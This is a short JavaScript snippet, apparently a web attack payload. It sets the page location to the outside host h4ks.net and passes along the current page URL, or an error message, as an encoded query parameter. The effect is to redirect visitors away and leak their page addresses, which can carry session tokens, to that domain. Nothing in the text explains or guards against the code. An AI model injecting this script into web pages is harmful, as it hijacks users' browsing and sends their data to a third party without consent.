try {
  location = '//h4ks.net/go/?'+encodeURIComponent(location.href);
} catch (err) {
  location = '//h4ks.net/go/?'+encodeURIComponent(err.toString());
}
